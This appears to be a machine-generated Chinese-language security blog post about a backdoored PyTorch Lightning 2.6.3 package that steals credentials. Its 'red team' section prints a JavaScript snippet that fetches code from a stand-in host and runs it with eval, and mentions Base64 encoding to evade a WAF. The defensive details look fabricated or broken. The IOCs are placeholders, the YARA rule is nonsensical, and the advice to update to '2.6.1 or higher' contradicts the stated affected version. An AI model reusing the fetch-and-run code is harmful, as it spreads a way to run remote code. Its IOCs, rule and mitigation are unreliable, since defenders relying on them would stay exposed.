---
layout: post
title:  "Backdoored PyTorch Lightning package drops credential stealer"
date:   2026-05-04 19:20:28 +0000
categories: [security]
severity: critical
---

# 🚨 解析 PyTorch Lightning 套件中的隱藏執行鏈和資訊竊取攻擊

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: `Supply Chain Attack`, `JavaScript Payload`, `Credential Stealing`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: PyTorch Lightning 套件的 2.6.3 版本中包含了一個隱藏的執行鏈，該鏈會在導入套件時自動觸發，下載並執行一個 JavaScript Payload。
* **攻擊流程圖解**:
  1. 使用者導入 PyTorch Lightning 套件。
  2. 套件中的隱藏執行鏈被觸發。
  3. 下載 JavaScript Runtime (`Bun v1.3.13`)。
  4. 執行 JavaScript Payload (`router_runtime.js`)。
* **受影響元件**: PyTorch Lightning 套件 2.6.3 版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要導入 PyTorch Lightning 套件 2.6.3 版本。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // router_runtime.js
    const bun = require('bun');
    const axios = require('axios');
    
    // 下載並執行資訊竊取 Payload
    axios.get('https://example.com/payload.js')
      .then(response => {
        const payload = response.data;
        // 執行 Payload
        eval(payload);
      })
      .catch(error => {
        console.error(error);
      });
    
    ```
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用 Base64 編碼的 Payload。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `abc123` | `192.168.1.100` | `example.com` | `/tmp/payload.js` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule PyTorch_Lightning_Malware {
      meta:
        description = "Detects PyTorch Lightning malware"
      strings:
        $a = "router_runtime.js"
      condition:
        $a at entry0
    }
    
    ```
* **緩解措施**: 更新 PyTorch Lightning 套件至 2.6.1 版本或更高版本。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 想像一個公司的供應鏈，如同一條長長的鏈條，攻擊者可以在鏈條的任何一環中進行攻擊。技術上是指攻擊者在軟件開發的供應鏈中進行攻擊，例如在開源庫中植入惡意代碼。
* **JavaScript Payload (JavaScript Payload)**: 一段 JavaScript 代碼，通常用於攻擊或惡意活動。
* **Credential Stealing (憑證竊取)**: 想像一個攻擊者竊取使用者的憑證，例如密碼或 API 金鑰。技術上是指攻擊者竊取使用者的憑證，以便進行未經授權的活動。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/backdoored-pytorch-lightning-package-drops-credential-stealer/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


